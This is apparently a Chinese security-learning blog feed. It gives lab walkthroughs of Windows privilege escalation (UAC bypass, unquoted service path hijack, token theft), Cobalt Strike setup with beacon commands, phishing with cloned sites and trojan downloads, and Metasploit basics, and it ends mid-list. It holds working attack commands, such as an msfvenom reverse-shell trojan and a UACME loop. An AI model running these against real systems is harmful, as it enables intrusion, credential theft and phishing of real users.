Vista中引入的技术。UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。在Windows Vista及以后的版本中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。在权限不够的情况下，访问系统磁盘的根目录、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account Control，用户账号控制)的认证。</p><p>也就是这个</p><p><img src="https://bu.dusays.com/2024/10/11/67092b4d38cba.png" alt="image-20240822185612032"></p><p>我们可以在win+R中用msconfig查看开启情况</p><p><img src="https://bu.dusays.com/2024/10/11/67092b3d60981.png" alt="image-20240822185750972"></p><p><img src="https://bu.dusays.com/2024/10/11/67092b3deee2a.png" alt="image-20240822185830248"></p><p>现在是默认</p><p>这种情况我们的提权是不能成功的</p><p><strong>而UAC提权就用于</strong></p><ul><li><strong>该电脑位于管理员组</strong></li><li><strong>该电脑开启了UAC</strong></li></ul><p>现在我以一台win7当靶机</p><h4 id="bypassuac模块"><a href="#bypassuac模块" class="headerlink" title="bypassuac模块"></a>bypassuac模块</h4><p>使用msf中的这个模块可以绕过</p><p><code>use exploit/windows/local/bypassuac</code></p><p>这里可以点两下tap</p><p><img src="https://bu.dusays.com/2024/10/11/67092b54ef26e.png" alt="image-20240822190742393"></p><p>这里我们自己选择模块 都可以用</p><p>这里我们先用默认的</p><p><code>use exploit/windows/local/bypassuac</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092b55cdeec.png" alt="image-20240822191725852"></p><p>同样只需要配置sessions</p><p>上线</p><p><img src="https://bu.dusays.com/2024/10/11/67092b52df2fa.png" alt="image-20240822191810043"></p><p><img src="https://bu.dusays.com/2024/10/11/67092b401a8a7.png" alt="image-20240822192335382"></p><p>可以看到 虽然还是普通用户权限 但是已经绕过uac了 getsystem成功</p><h4 id="runas模块"><a href="#runas模块" class="headerlink" title="runas模块"></a>runas模块</h4><p>要求也是知道管理员密码或者在管理员组里</p><p><code>use exploit/windows/local/ask</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092b52e58fb.png" alt="image-20240822193051048"></p><p>此时 目标主机会有弹窗</p><p><img src="https://bu.dusays.com/2024/10/11/67092b406b3da.png" alt="image-20240822193241505"></p><p>点是 则提权成功</p><p>否则提权失败</p><p>否：</p><p><img src="https://bu.dusays.com/2024/10/11/67092b47dc469.png" alt="image-20240822193440165"></p><p>是：</p><p><img src="https://bu.dusays.com/2024/10/11/67092b4a1d3e1.png" alt="image-20240822193512879"></p><p>上线</p><p>成功绕过uac</p><p><img src="https://bu.dusays.com/2024/10/11/67092b3fc44f3.png" alt="image-20240822193541781"></p><h4 id="UACME"><a href="#UACME" class="headerlink" title="UACME"></a>UACME</h4><p>集成了70+uac提权方式</p><p><a href="github.com/hfiref0x/UACME">uacme</a></p><p>使用方法：程序名+编号+想要执行的程序</p><p><img src="https://bu.dusays.com/2024/10/11/67092b4946d9a.png" alt="image-20240825000502735"></p><p>没有出弹窗表示不能用</p><p>可以用一个for循环来执行</p><p><code>for /L %I in (1,1,76) Do @Akagi64.exe %I C:\windows\system32\cmd.exe</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092b4144c73.png" alt="image-20240822235054854"></p><p>成功执行到管理员的cmd</p><p>如果执行的是木马</p><p>那就是以管理员身份执行</p><p>我们先进入一个低权限的会话</p><p><code>shell</code></p><p>cd到木马的地址</p><p><img src="https://bu.dusays.com/2024/10/11/67092b55852b8.png" alt="image-20240822235531935"></p><p>现在我们可以执行uacme的命令了</p><p><code>for /L %I in (1,1,76) Do @Akagi64.exe %I xiaoming.exe</code></p><p>注意 我们现在是普通用户的会话，而这个程序会以管理员来执行，所以我们要新建一个监听器来监听这个会话</p><p><img src="https://bu.dusays.com/2024/10/11/67092b4818d0f.png" alt="image-20240823000458239"></p><p>0.0.0.0好像有点报错</p><p>换成kali ip</p><p><img src="https://bu.dusays.com/2024/10/11/67092b47c7b46.png" alt="image-20240823000826587"></p><p>上线</p><p><img src="https://bu.dusays.com/2024/10/11/67092b41357f1.png" alt="image-20240823000849474"></p><p>提权成功</p><h3 id="系统服务提权"><a href="#系统服务提权" class="headerlink" title="系统服务提权"></a>系统服务提权</h3><h4 id="利用可信任的服务路径提权"><a href="#利用可信任的服务路径提权" class="headerlink" title="利用可信任的服务路径提权"></a>利用可信任的服务路径提权</h4><p>在windows中有一个文件路径解析特性：</p><p>当一个路径中存在空格 那么系统会认为后面的是参数</p><p>c:\program files</p><p>这样系统在运行这项服务时会调用可执行程序来进行运行</p><p>但是如果有双引号包裹，系统就会知道这是一个完整的路径</p><p>我们在这里可以看到服务的执行路径</p><p>任务管理器–&gt;服务–&gt;开启服务</p><p><img src="https://bu.dusays.com/2024/10/11/67092b5743c4b.png" alt="image-20240823003222403"></p><p><img src="https://bu.dusays.com/2024/10/11/67092b5189ebe.png" alt="image-20240823003259176"></p><p>例如某服务的启动路径为</p><p>“C:\Program Files\Sub Dir\Service.exe”</p><p>当该服务重启时，对于该路径中每一个空格，windows都会尝试寻找同名的二进制文件，并进行启动，对于上面的路径，windows就会依次尝试启动</p><p>C:\Program.exe</p><p>C:\Program Files\Sub.exe</p><p>C:\Program Files\Sub Dir\Service.exe</p><p>此时如果我们能够找到目标服务 一个没有双引号包裹，并且路径带有空格的应用程序</p><p>我们就可以把我们的木马进行伪造</p><p>比如：</p><p>这是一个目标服务：</p><p>C:\program files\system32\svchost.exe -k AxInstSVGroup</p><p>我们就可以伪造我们的木马为：<br>program.exe放到C盘下</p><p>当这个服务启动时 就会调用到我们的木马程序</p><p>并且能调用服务的都是system权限 相当于system权限运行到了木马</p><p>我们可以通过这个命令来查目标服务：<br><code>wmic service where &quot;startmode=&#39;Auto&#39; and not pathname like &#39;C:\\Windows\\%&#39;&quot; get Name, DisplayName, PathName, StartMode</code></p><p>cmd查</p><p><img src="https://bu.dusays.com/2024/10/11/67092b4f51b7b.png" alt="image-20240823003817089"></p><p>这条命令也可以查：</p><p><code>wmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\&quot; |findstr/i /v &quot;&quot;&quot;</code></p><p>找到目标服务路径</p><blockquote><p>C:\Program Files\ChromeCore\ChromeCoreSvr.exe</p></blockquote><p><img src="https://bu.dusays.com/2024/10/11/67092b5090706.png" alt="image-20240823004016443"></p><p>所以</p><p>我们直接伪装木马为：</p><p>program.exe</p><p>并放在C盘下</p><p>这样他在启动这个服务时就会发现我们的木马而把后面的Files\ChromeCore\ChromeCoreSvr.exe当成参数</p><p><strong>同样木马时MSF生成的</strong></p><p>MSF开监听</p><p>我们直接重启电脑</p><p>服务在每次重启或者暂停后都会重新开启这个服务</p><p>警告了</p><p><img src="https://bu.dusays.com/2024/10/11/67092b45af8ca.png" alt="image-20240823004642329"></p><p>这里也可手动重启：<br><img src="https://bu.dusays.com/2024/10/11/67092b5003348.png" alt="image-20240823004542531"></p><p>我们手动重启一下</p><p>上线</p><p><img src="https://bu.dusays.com/2024/10/11/67092b455a7b2.png" alt="image-20240823004609488"></p><p>并且权限为system</p><h3 id="访问令牌操纵提权"><a href="#访问令牌操纵提权" class="headerlink" title="访问令牌操纵提权"></a>访问令牌操纵提权</h3><p>Windows中的访问令牌分为主令牌和模拟令牌，主令牌与进程相关联，每个进程都有一个主令牌。通过操纵访问令牌来使某个进程正在运行的进程像是其他用户启动进程的子进程，从而达到提权的效果，称为令牌窃取。由于需要调用windows上的特殊API，因此通常用于将管理员用户剃刀SYSTEM等更高级的用户</p><p>msf可以窃取</p><p>需要用到这个模块–&gt;incognito</p><p><code>use incognito      </code></p><p>然后列出所有令牌</p><p><code>list_tokens -u</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092b50157e6.png" alt="image-20240823005732073"></p><p>这里没有令牌</p><p>我们现在需要管理员的令牌</p><p>所以要以管理员身份运行木马</p><p><img src="https://bu.dusays.com/2024/10/11/67092b45e7188.png" alt="image-20240823005949701"></p><p>有了</p><p>模拟一下令牌：</p><p><code>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092b433e4c0.png" alt="image-20240823010049430"></p><p>现在是system权限了</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 提权 </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt-Strike</title>
      <link href="/2024/10/11/Cobalt-Strike/"/>
      <url>/2024/10/11/Cobalt-Strike/</url>
      
        <content type="html"><![CDATA[<h1 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="CS介绍"><a href="#CS介绍" class="headerlink" title="CS介绍"></a>CS介绍</h3><p>Cobalt Strike是美国Red Team开发的渗透测试神器，简称cs,是一款渗透神器。</p><p>主要用于后渗透方面的攻击，且具备团队作战的功能</p><p><a href="https://www.cobaltstrike.com/">官网地址</a></p><p><strong>Cobalt Strike</strong>的特点：</p><p>团队协作功能</p><p>丰富的生成木马模块：可生成exe,dll,powershell,hta,图片捆绑,bad USB,vba宏木马,以及shellcode等；</p><p>钓鱼攻击及探针模块：自动化挂马链接生成,自动化钓鱼及探针；</p><p>后渗透攻击模块：浏览器进程代理、文件操作、提权模块、跳板、DLL进程注入、端口转发、内网端口扫描、socks代理、令牌窃取利用、mimikatz套件等；</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><img src="https://bu.dusays.com/2024/10/11/67092a4a10caa.png" alt="image-20240821145743885"></p><p>点后</p><p><img src="https://bu.dusays.com/2024/10/11/67092a2f99268.png" alt="image-20240821145808567"></p><p>这个是客户端</p><p><img src="https://bu.dusays.com/2024/10/11/67092a2fce2b3.png" alt="image-20240821145835564"></p><p>文件夹里这个是服务端</p><p>当多个客户端连接上同一个服务端(团队渗透)时 一台客户端获得的权限其他客户端也可以获得(权限共享)</p><blockquote><p>在cobalt strike中，服务端最好运行在linux平台上，服务端的关键文件是teamserver和cobaltstrike.jar将这两个文件放在同一目录下运行运行服务端命令：(4.5以前 4.5以后增TeamServerImage)</p><p>.&#x2F;teamserver <host> <password> [&#x2F;path&#x2F;to&#x2F;c2.profile] [YYYY-MM-DD]</p><p><host>  必需参数 团队服务器IP</p><p><password>  必需参数 连接服务器的密码</p><p>[&#x2F;path&#x2F;to&#x2F;c2.profile]  可选参数 指定C2通信配置文件，体现其强大的扩展性</p><p>[YYYY-MM-DD]  可选参数 所有payload的终止时间</p></blockquote><p>也可以放在云服务器上</p><p>这里还是放在kali上</p><p>解压</p><p><img src="https://bu.dusays.com/2024/10/11/67092a4aa5663.png" alt="image-20240821151152729"></p><p>进到解压后的文件夹里</p><p><img src="https://bu.dusays.com/2024/10/11/67092a498aa78.png" alt="image-20240821151316567"></p><p>比较重要的是：</p><ul><li>teamserver</li><li>TeamServerImage</li></ul><p>注意这里要把这两个文件权限设置成777 不然打开不了</p><p><img src="https://bu.dusays.com/2024/10/11/67092a4aa8c4a.png" alt="image-20240821151622189"></p><p>这样我们就可以开启服务端了 按上面写的</p><blockquote><p>.&#x2F;teamserver <host> <password></p></blockquote><p>.&#x2F;teamserver 192.168.49.133 123456</p><p><img src="https://bu.dusays.com/2024/10/11/67092a4a10cb2.png" alt="image-20240821152324319"></p><p>好 到这里服务端就可以了</p><p>现在我们打开客户端</p><p><img src="https://bu.dusays.com/2024/10/11/67092a2f93132.png" alt="image-20240821152553919"></p><p>端口用默认的50050就行</p><p>别名可以自己改个用于区分的名字</p><p>然后连接</p><p><img src="https://bu.dusays.com/2024/10/11/67092a31009d7.png" alt="image-20240821160734735"></p><p>会直接进来</p><p><img src="https://bu.dusays.com/2024/10/11/67092a405b747.png" alt="image-20240821161155329"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><a href="https://github.com/aleenzz/Cobalt_Strike_wiki/tree/master">使用手册</a></p><h3 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h3><p><img src="https://bu.dusays.com/2024/10/11/67092a3a8d14d.png" alt="image-20240821161741117"></p><p>监听器可以生成木马拿下权限</p><p>先选载荷</p><p><img src="https://bu.dusays.com/2024/10/11/67092a305feed.png" alt="image-20240821161915169"></p><p>生成</p><p><img src="https://bu.dusays.com/2024/10/11/67092a2fdc4bf.png" alt="image-20240821162029170"></p><p>然后要给他一个路径</p><p><img src="https://bu.dusays.com/2024/10/11/67092a32a981f.png" alt="image-20240821162058753"></p><p>攻击者一旦点击木马 我们就会监听到</p><p><img src="https://bu.dusays.com/2024/10/11/67092a43614ae.png" alt="image-20240821162242336"></p><p>注意last 这个表示我们执行命令的时间 这里也就是我们的命令要8s才执行</p><p>所以我们要改回连间隔</p><p><img src="https://bu.dusays.com/2024/10/11/67092a4210613.png" alt="image-20240821162625770"></p><p>改成1</p><p><img src="https://bu.dusays.com/2024/10/11/67092a2fee90b.png" alt="image-20240821162703987"></p><p>会话交互</p><p><img src="https://bu.dusays.com/2024/10/11/67092a3dae7d8.png" alt="image-20240821162749902"></p><p>可以使用beacon命令</p><blockquote><p>Beacon Commands</p><p>Command          Description</p><hr><p>argue           进程参数欺骗</p><p>blockdlls         在子进程中阻止非Microsoft的DLLs文件</p><p>browserpivot        注入受害者浏览器进程</p><p>bypassuac         绕过UAC</p><p>cancel           取消正在进行的下载</p><p>cd             切换目录</p><p>checkin          强制让被控端回连一次</p><p>clear           清除beacon内部的任务队列</p><p>connect          通过TCP连接到Beacon</p><p>covertvpn         部署Covert VPN客户端</p><p>cp             复制文件</p><p>dcsync           从DC中提取密码哈希</p><p>desktop          远程VNC</p><p>dllinject         反射DLL注入进程</p><p>dllload          使用LoadLibrary将DLL加载到进程中</p><p>download          下载文件</p><p>downloads         列出正在进行的文件下载</p><p>drives           列出目标盘符</p><p>elevate          尝试提权</p><p>execute          在目标上执行程序(无输出)</p><p>execute-assembly      在目标上内存中执行本地.NET程序</p><p>exit            退出beacon</p><p>getprivs          对当前令牌启用系统权限</p><p>getsystem         尝试获取SYSTEM权限</p><p>getuid           获取用户ID</p><p>hashdump          转储密码哈希值</p><p>help            帮助</p><p>inject           在特定进程中生成会话</p><p>jobkill          杀死一个后台任务</p><p>jobs            列出后台任务</p><p>kerberos_ccache_use    从ccache文件中导入票据应用于此会话</p><p>kerberos_ticket_purge   清除当前会话的票据</p><p>kerberos_ticket_use    从ticket文件中导入票据应用于此会话</p><p>keylogger         键盘记录</p><p>kill            结束进程</p><p>link            通过命名管道连接到Beacon</p><p>logonpasswords       使用mimikatz转储凭据和哈希值</p><p>ls             列出文件</p><p>make_token         创建令牌以传递凭据</p><p>mimikatz          运行mimikatz</p><p>mkdir           创建一个目录</p><p>mode dns          使用DNS A作为通信通道(仅限DNS beacon)</p><p>mode dns-txt        使用DNS TXT作为通信通道(仅限D beacon)</p><p>mode dns6         使用DNS AAAA作为通信通道(仅限DNS beacon)</p><p>mode http         使用HTTP作为通信通道</p><p>mv             移动文件</p><p>net            net命令</p><p>note            给当前目标机器备注   </p><p>portscan          进行端口扫描</p><p>powerpick         通过Unmanaged PowerShell执行命令</p><p>powershell         通过powershell.exe执行命令</p><p>powershell-import     导入powershell脚本</p><p>ppid            为生成的post-ex任务设置父PID</p><p>ps             显示进程列表</p><p>psexec           使用服务在主机上生成会话</p><p>psexec_psh         使用PowerShell在主机上生成会话</p><p>psinject          在特定进程中执行PowerShell命令</p><p>pth            使用Mimikatz进行传递哈希</p><p>pwd            当前目录位置</p><p>reg            查询注册表</p><p>rev2self          恢复原始令牌</p><p>rm             删除文件或文件夹</p><p>rportfwd          端口转发</p><p>run            在目标上执行程序(返回输出)</p><p>runas           以另一个用户权限执行程序</p><p>runasadmin         在高权限下执行程序</p><p>runu            在另一个PID下执行程序</p><p>screenshot         屏幕截图</p><p>setenv           设置环境变量</p><p>shell           cmd执行命令</p><p>shinject          将shellcode注入进程</p><p>shspawn          生成进程并将shellcode注入其中</p><p>sleep           设置睡眠延迟时间</p><p>socks           启动SOCKS4代理</p><p>socks stop         停止SOCKS4</p><p>spawn           生成一个会话</p><p>spawnas          以其他用户身份生成会话</p><p>spawnto          将可执行程序注入进程</p><p>spawnu           在另一个PID下生成会话</p><p>ssh            使用ssh连接远程主机</p><p>ssh-key          使用密钥连接远程主机</p><p>steal_token        从进程中窃取令牌</p><p>timestomp         将一个文件时间戳应用到另一个文件</p><p>unlink           断开与Beacon的连接</p><p>upload           上传文件</p></blockquote><h3 id="会话转移"><a href="#会话转移" class="headerlink" title="会话转移"></a>会话转移</h3><h4 id="CS转MSF"><a href="#CS转MSF" class="headerlink" title="CS转MSF"></a>CS转MSF</h4><p>首先要创建一个监听器</p><p><img src="https://bu.dusays.com/2024/10/11/67092a42ae471.png" alt="image-20240821173418717"></p><p>注意 payload要选foreign 端口随便设  ip是服务器ip</p><p>然后到MSF里</p><p>进到multi&#x2F;handler里</p><p><code>use exploit/multi/handler</code></p><p>然后设置payload</p><p>set payload <code>windows/meterpreter/reverse_http</code></p><p>设置cs服务端地址</p><p><code>set lhost 192.168.10.127</code></p><p>设置监听器端口号</p><p><code>set lport 6969</code></p><p>run</p><p><img src="https://bu.dusays.com/2024/10/11/67092a3460485.png" alt="image-20240821174204853"></p><p>回到cs</p><p>把想转的会话新建会话</p><p><img src="https://bu.dusays.com/2024/10/11/67092a4767a9c.png" alt="image-20240821174304972"></p><p>选刚刚新建的监听器</p><p><img src="https://bu.dusays.com/2024/10/11/67092a314653e.png" alt="image-20240821174423537"></p><p>他会自动的找kali</p><p><img src="https://bu.dusays.com/2024/10/11/67092a477174d.png" alt="image-20240821174452914"></p><p>成功</p><h4 id="MSF转CS"><a href="#MSF转CS" class="headerlink" title="MSF转CS"></a>MSF转CS</h4><p>CS先创建一个监听器 用Beacon</p><p><img src="https://bu.dusays.com/2024/10/11/67092a390dd8c.png" alt="image-20240821180332928"></p><p>同样 MSF先生成一个木马</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.172 lport=9999 -f exe -o xiaoming.exe</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092a33a9f36.png" alt="image-20240821174744035"></p><p>multi&#x2F;handler监听</p><p><img src="https://bu.dusays.com/2024/10/11/67092a3ad5774.png" alt="image-20240821175008410"></p><p>记得把payload改成tcp</p><p>上线</p><p><img src="https://bu.dusays.com/2024/10/11/67092a410365f.png" alt="image-20240821175133770"></p><p>先给他挂到后台</p><p>background</p><p>这里要进到一个新模块：</p><p>exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</p><p><code>use exploit/windows/local/payload_inject</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092a3756146.png" alt="image-20240821175510719"></p><p>这里需要设置</p><p>payload: windows&#x2F;meterpreter&#x2F;reverse_http</p><p>session: session 4</p><p>lhost: 192.168.10.172（cs服务端ip）</p><p>lport: 9696（cs创的监听器端口）</p><p>disablepayloadhandler: </p><p><img src="https://bu.dusays.com/2024/10/11/67092a48a3e89.png" alt="image-20240821180009511"></p><p>回到CS</p><p>多了一个MSF的会话</p><p><img src="https://bu.dusays.com/2024/10/11/67092a464df23.png" alt="image-20240821180126549"></p><p>成功</p><h3 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h3><p>信息收集</p><p><img src="https://bu.dusays.com/2024/10/11/67092a3187184.png" alt="image-20240821181350379"></p><p><img src="https://bu.dusays.com/2024/10/11/67092a306469d.png" alt="image-20240821181441521"></p><p>当访问ip&#x2F;baidu时就会跳转到<code>www.baidu.com</code></p><p><img src="https://bu.dusays.com/2024/10/11/67092a32e8844.png" alt="image-20240821181547875"></p><p>会留下一些信息</p><p><img src="https://bu.dusays.com/2024/10/11/67092a393f5be.png" alt="image-20240821181635624"></p><p>应用程序中有</p><img src="https://bu.dusays.com/2024/10/11/67092a3a27660.png" alt="image-20240821181705169" style="zoom:50%;" /><p>现在我们来克隆</p><p><img src="https://bu.dusays.com/2024/10/11/67092a30716e3.png" alt="image-20240821181301367"></p><p>填一下信息  克隆</p><p><img src="https://bu.dusays.com/2024/10/11/67092a321f249.png" alt="image-20240821182733064"></p><p>得到地址</p><p><img src="https://bu.dusays.com/2024/10/11/67092a3258268.png" alt="image-20240821181902081"></p><p>当访问这个地址时 看到的和克隆的一样</p><p>当在这个地址输入东西时会留下痕迹</p><p><img src="https://bu.dusays.com/2024/10/11/67092a3642f55.png" alt="image-20240821182042389"></p><p>键盘记录：</p><p><img src="https://bu.dusays.com/2024/10/11/67092a3950837.png" alt="image-20240821182100986"></p><h3 id="文件托管"><a href="#文件托管" class="headerlink" title="文件托管"></a>文件托管</h3><p><img src="https://bu.dusays.com/2024/10/11/67092a309e069.png" alt="image-20240821182330019"></p><p>可以选一个木马文件</p><p><img src="https://bu.dusays.com/2024/10/11/67092a39cbe7f.png" alt="image-20240821182456076"></p><p>同样给了一个地址</p><p><img src="https://bu.dusays.com/2024/10/11/67092a326580f.png" alt="image-20240821182531782"></p><p>访问这个地址会自动下载这个木马</p><p>现在我们可以结合克隆的网站</p><p><img src="https://bu.dusays.com/2024/10/11/67092a321f249.png" alt="image-20240821182739715"></p><p>攻击这里可以选择我们刚刚生成的文件</p><p><img src="https://bu.dusays.com/2024/10/11/67092a3bbb8ff.png" alt="image-20240821182805525"></p><p>这样也会自动下载木马</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>CS添加脚本后会很猛</p><p><img src="https://bu.dusays.com/2024/10/11/67092a31c9661.png" alt="image-20240821183100324"></p><p>脚本管理器</p><p>点下面的加载</p><p>加载自己的脚本</p><p>CS文件夹里有一些自带的脚本</p><p><img src="https://bu.dusays.com/2024/10/11/67092a3080561.png" alt="image-20240821183418379"></p><p>这些文件夹里有.cna文件</p><p><img src="https://bu.dusays.com/2024/10/11/67092a308e56a.png" alt="image-20240821183600048"></p><p>加载这个就行</p><p><img src="https://bu.dusays.com/2024/10/11/67092a3c03557.png" alt="image-20240821183652483"></p><p>加载后会有新东西</p><p><img src="https://bu.dusays.com/2024/10/11/67092a4290ad3.png" alt="image-20240821183753185"></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><img src="https://bu.dusays.com/2024/10/11/67092a45416cb.png" alt="image-20240821163815976"></p><p>还可以抓hash</p><p>提权</p><p><img src="https://bu.dusays.com/2024/10/11/67092a377708c.png" alt="image-20240821163917892"></p><p>带*的是system权限</p><p>还有vnc</p><p><img src="https://bu.dusays.com/2024/10/11/67092a45866c3.png" alt="image-20240821164308872"></p><p>包括进程注入</p><p>下面进程–&gt;监听器</p><p><img src="https://bu.dusays.com/2024/10/11/67092a498ad1b.png" alt="image-20240821164741601"></p><p>注入成功</p><p><img src="https://bu.dusays.com/2024/10/11/67092a394b271.png" alt="image-20240821164831828"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matasploit</title>
      <link href="/2024/10/11/matasploit/"/>
      <url>/2024/10/11/matasploit/</url>
      
        <content type="html"><![CDATA[<h1 id="matasploit"><a href="#matasploit" class="headerlink" title="matasploit"></a>matasploit</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><strong>Metasploit就是一个漏洞框架</strong>。它的全称叫做The Metasploit Framework，<strong>简称MSF</strong>。是一个免费、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数2000多个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布MSF时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为MSF团队一直都在努力开发各种攻击工具，并将它们贡献给所有MSF用户。</p><p>MSF的设计初衷是打造成一个攻击工具开发平台，然而在目前情况下，安全专家以及业余安全爱好者更多地将其当作一种点几下鼠标就可以利用其中附带的攻击工具进行成功攻击的环境。</p><p><strong>kali中已经集成了MSF</strong></p><h3 id="MSF中的相关概念"><a href="#MSF中的相关概念" class="headerlink" title="MSF中的相关概念"></a>MSF中的相关概念</h3><ul><li>渗透攻击（Exploit）</li></ul><p>渗透攻击是指由攻击者或者渗透测试者利用系统、应用或服务中的安全漏洞，所进行的攻击行为。</p><p>流行的攻击技术包括：缓冲区溢出、Web应用程序漏洞攻击，以及利用配置错误等。</p><ul><li>攻击载荷（Payload）</li></ul><p>攻击载何是我们期望目标系统在被渗透攻击后而执行的代码。在MSF框架中可以自由的选择、传送和植入。比如，反弹式shell是一种从目标主机到攻击主机创建网络连接，并提供命令行shell的攻击载荷。bind shell攻击载荷则在目标主机上将命令行shell绑定到一个打开的监听端口，攻击者可以连接这些端口来取得shell交互。</p><ul><li>溢出代码（Shellcode）</li></ul><p>shellcode是在渗透攻击时作为攻击载荷运行的一组机器指令。shellcode通常用汇编语言编写。在大多数情况下，目标系统执行了shellcode这一组指令后，才会提供一个命令行shell或者Meterpreter shell，这也是shellcode名称的由来。</p><ul><li>模块（Module）</li></ul><p>在MSF中，一个模块是指MSF框架中所使用的一段软件代码组件。在某些时候，你可能会使用一个渗透攻击模块（Exploit module），也就是用于实际发起渗透攻击的软件组件。而在其它时候，则可能使用一个辅助模块（auxiliary module），用来扫描一些诸如扫描或系统查点的攻击动作。</p><p><strong>MSF中都是按照对应模块进行区分的</strong>  </p><ul><li>监听器（Listener）</li></ul><p>监听器是MSF中用来等待连入网络连接的组件。举例来说，在目标主机被渗透攻击之后，它可能会通过互联网回连到攻击主机上，而监听器组件在攻击主机上等待被渗透攻击的系统来连接，并负责处理这些网络连接。</p><p><strong>配置完攻击载荷后要在本地开启对应的监听器 用于接受发送链接</strong></p><h2 id="MSF目录结构"><a href="#MSF目录结构" class="headerlink" title="MSF目录结构"></a>MSF目录结构</h2><p><img src="https://bu.dusays.com/2024/10/11/6709290ab9254.png" alt="image-20240820161538810"></p><p>kali中的MSF</p><p><code>cd /usr/share/metasploit-framework</code></p><p><img src="https://bu.dusays.com/2024/10/11/670929218883b.png" alt="image-20240820162834791"></p><p><strong>modules里有我们需要的模块</strong></p><p><img src="https://bu.dusays.com/2024/10/11/6709290b0ec7d.png" alt="image-20240820163128335"></p><p>auxiliary–&gt;辅助模块</p><p>expoloit–&gt;攻击模块</p><p>encoders–&gt;编码模块</p><p>nops–&gt;空指令模块</p><p>post–&gt;后渗透攻击模块</p><p>evasion–&gt;免杀模块</p><p>payload–&gt;载荷模块</p><p><strong>data中有一些我们需要的工具和用户的接口代码</strong></p><p><strong>scripts中存放了我们可利用的脚本</strong></p><p><strong>plugins存放的用户加载时会用到的插件</strong></p><h2 id="MSF基本命令"><a href="#MSF基本命令" class="headerlink" title="MSF基本命令"></a>MSF基本命令</h2><p>MSF中可以直接执行Linux命令</p><h3 id="更新MSF"><a href="#更新MSF" class="headerlink" title="更新MSF"></a>更新MSF</h3><p>apt-get install metasploit-framework</p><p><img src="https://bu.dusays.com/2024/10/11/6709293098b6f.png" alt="image-20240820165838582"></p><h3 id="启动MSF"><a href="#启动MSF" class="headerlink" title="启动MSF"></a>启动MSF</h3><ul><li>msfdb run</li><li>msfcosle</li></ul><p>这两条命令都可以启动msf</p><p>出现msf6就表明进去了</p><p>退出exit</p><p><img src="https://bu.dusays.com/2024/10/11/6709291b20f60.png" alt="image-20240820170614344"></p><p>一般用msfdb run</p><p>如果数据库报错就exit 然后再用msfcosle</p><h3 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h3><p>help</p><p>在msf6 &gt;后输help即可</p><p><img src="https://bu.dusays.com/2024/10/11/6709291fafbb0.png" alt="image-20240820170807636"></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li><p>back     返回上一层</p></li><li><p>info     显示一个或多个模块信息</p></li><li><p>show     同info</p></li><li><p>background     把会话挂到后台</p></li><li><p>use      使用对应模块</p></li><li><p>set      相应设置</p></li><li><p>unset    取消相应设置</p></li><li><p>search   查询模块</p></li></ul><p>这里有个表 常用的</p><p>?  执行？命令：帮助菜单</p><p>search  搜索模块名和描述。</p><p>use 使用命令</p><p>back  从当前环境返回。</p><p>Banner 命令，显示一个MSF的banner。</p><p>color  颜色转换</p><p>connect 连接一个主机</p><p>exit 退出MSF</p><p>info  显示一个或多个模块的信息</p><p>irb 进入irb脚本模式。</p><p>jobs 显示和管理作业（和windows任务管理器的进程作用一样）</p><p>kill 杀死一个作业（和结束进程的作用一样）。</p><p>loadpath 加载一个模块的路径。</p><p>quit 退出MSF。</p><p>load 加载一个插件。</p><p>load 加载一个插件。</p><p>route 查看一个会话的路由信息。</p><p>save 保存动作</p><p>set 给一个变量赋值</p><p>show 显示给所有类型的模块</p><p>setg 